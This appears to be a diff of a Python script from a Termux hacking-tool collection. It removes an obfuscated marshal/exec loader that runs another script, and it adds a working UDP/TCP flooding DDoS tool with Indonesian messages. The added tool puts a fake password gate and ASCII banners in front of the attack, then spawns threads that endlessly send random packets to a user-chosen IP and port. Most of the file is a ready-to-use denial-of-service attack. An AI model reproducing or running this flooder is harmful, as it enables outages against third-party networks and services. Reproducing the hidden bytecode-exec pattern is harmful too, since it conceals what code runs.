@@ -1,2 +1,179 @@
-import marshal
-exec(marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNsl\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xd8\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNsD\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xb0\x04\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\x1c\x04\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\x88\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xf4\x02\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs`\x02\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xcc\x01\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs8\x01\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xa4\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00s\x1d\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00\x01d\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\x18\x00\x00\x00python2 .termux-style.py(\x02\x00\x00\x00t\x02\x00\x00\x00ost\x06\x00\x00\x00system(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<Sanz>t\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<Sanz>t\x08\x00\x00\x00<module>\x04\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<Sanz>t\x08\x00\x00\x00<module>\x04\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<Sanz>t\x08\x00\x00\x00<module>\x04\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<Sanz>t\x08\x00\x00\x00<module>\x04\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<Sanz>t\x08\x00\x00\x00<module>\x04\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<Sanz>t\x08\x00\x00\x00<module>\x04\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<Sanz>t\x08\x00\x00\x00<module>\x04\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<Sanz>t\x08\x00\x00\x00<module>\x04\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<Sanz>t\x08\x00\x00\x00<module>\x04\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<Sanz>t\x08\x00\x00\x00<module>\x04\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<Sanz>t\x08\x00\x00\x00<module>\x04\x00\x00\x00s\x02\x00\x00\x00\x0c\x01'))
+password ='Ddos'
+import random
+import socket
+import threading
+import os,sys
+import time
+
+os.system("clear")
+
+for i in range(3):
+    pwd = input("[•] Akun: ")
+    j=3
+    if(pwd==password):
+        time.sleep(5)
+        print("[+] Tunggu Sedang Di Check")
+        break
+    else:
+        time.sleep(5)
+        print("[×] Salah Nama!!! ")
+        continue
+time.sleep(5)
+print("[@] Nama Berhasil")
+time.sleep(5)
+
+for i in range(3):
+    pwd = input("[•] Password : ")
+    j=3
+    if(pwd==password):
+        time.sleep(5)
+        print("[+] Tunggu Sedang Di Check!!! ")
+        break
+    else:
+        time.sleep(5)
+        print("[×] Salah Password!!! ")
+        continue
+time.sleep(5)
+print("[@] Login Berhasil")
+time.sleep(5)
+
+os.system("clear")
+print("\033[91m")
+print("""
+██╗███╗░░██╗██████╗░██╗░░░██╗████████╗
+██║████╗░██║██╔══██╗██║░░░██║╚══██╔══╝
+██║██╔██╗██║██████╔╝██║░░░██║░░░██║░░░
+██║██║╚████║██╔═══╝░██║░░░██║░░░██║░░░
+██║██║░╚███║██║░░░░░╚██████╔╝░░░██║░░░
+╚═╝╚═╝░░╚══╝╚═╝░░░░░░╚═════╝░░░░╚═╝░░░
+""")
+print("KETIK BAWAH")
+print("DDOS-ATTACK")
+
+test = input()
+if test == "D":
+    exit(5)
+os.system("clear")
+print("============⚠WARNING⚠︎============")
+print("JANGAN DI BUAT ABUSE KALO ABUSE TANGUNG SENDIRI BUKAN NYA GUA NAKUT NAKUTIN ABUSE TANGUNG SENDIRI DDOS BERBAU ILEGAL JADI JANGAN ABUSE TUNGGU 10 DETIK")
+print("============⚠WARNING⚠︎============")
+time.sleep(10)
+
+os.system("clear")
+print ("Autor : Lnsky ")
+print("""\033[91m
+██████╗░██████╗░░█████╗░░██████╗            
+██╔══██╗██╔══██╗██╔══██╗██╔════╝            
+██║░░██║██║░░██║██║░░██║╚█████╗░            
+██║░░██║██║░░██║██║░░██║░╚═══██╗            
+██████╔╝██████╔╝╚█████╔╝██████╔╝            
+╚═════╝░╚═════╝░░╚════╝░╚═════╝░            
+
+░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
+██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
+███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
+██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
+██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
+╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
+""")
+print("\033[0m")
+
+ip = str(input("\033[91m Target Host/Ip:"))
+port = int(input("\033[91m Target Port:"))
+choice = str(input("\033[91m Gas Ddos? (y/n):"))
+times = int(input("\033[91m Packets:"))
+threads = int(input("\033[91m Threads:"))
+print("APAKAH YAKIN IP INI? IP %s PORT %s"%(ip, port))
+choice = str(input("y/n:"))
+print("PROSES TUNGGU 5 DETIK")
+time.sleep(5)
+
+os.system("clear")
+print("\033[91m")
+print("LOADING.")
+time.sleep(1)
+print("LOADING..")
+time.sleep(1)
+print("LOADING...")
+time.sleep(1)
+print("LOADING....")
+time.sleep(1)
+print("LOADING.....")
+time.sleep(1)
+print("!!!!!!!PROGRAM START!!!!!!!")
+time.sleep(4)
+print("!!!!!!!LOOCKED IP %s PORT %s!!!!!!!"%(ip, port))
+time.sleep(2)
+print("!!!!!!!LOOCKED IP TUNGGU 10 DETIK!!!!!!!")
+time.sleep(10)
+os.system("clear")
+def run():
+        data = random._urandom(1800)
+        i = random.choice(("\033[93m[@] (LNSKY) ===> ","\033[93m[@] (LNSKY) ===> ","\033[93m[@] (LNSKY) ===> "))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        addr = (str(ip),int(port))
+                        for x in range(times):
+                                s.sendto(data,addr)
+                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
+                except:
+                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")
+
+def run2():
+        data = random._urandom(1024)
+        i = random.choice(("\033[93m[@] (LNSKY) ===> ","\033[93m[@] (LNSKY) ===> ","\033[93m[@] (LNSKY) ===> "))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                                s.send(data)
+                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
+                except:
+                        s.close()
+                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")
+
+def run3():
+        data = random._urandom(16)
+        i = random.choice(("\033[93m[@] (LNSKY) ===> ","\033[93m[@] (LNSKY) ===> ","\033[93m[@] (LNSKY) ===> "))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                                s.send(data)
+                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
+                except:
+                        s.close()
+                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")
+
+
+def run4():
+        data = random._urandom(16)
+        i = random.choice(("\033[93m[@] (LNSKY) ===> ","\033[93m[@] (LNSKY) ===> ","\033[93m[@] (LNSKY) ===> "))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                                s.send(data)
+                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
+                except:
+                        s.close()
+                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")
+
+for y in range(threads):
+        if choice == 'y':
+                th = threading.Thread(target = run)
+                th.start()
+                th = threading.Thread(target = run2)
+                th.start()
+                th = threading.Thread(target = run3)
+                th.start()
+        else:
+                th = threading.Thread(target = run4)
+                th.start()
